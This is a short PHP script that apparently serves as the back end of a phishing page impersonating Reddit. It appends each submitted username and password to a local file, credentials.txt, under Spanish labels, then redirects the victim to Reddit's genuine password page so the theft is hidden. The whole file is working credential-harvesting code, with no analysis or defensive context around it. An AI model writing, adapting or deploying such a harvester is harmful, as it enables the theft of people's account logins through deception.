<?php

file_put_contents("credentials.txt", "[+] Reddit -> Usuario: " . $_POST['username'] . " Contraseña: " . $_POST['password'] . "\n", FILE_APPEND);
header('Location: https://www.reddit.com/password');
exit();
?>
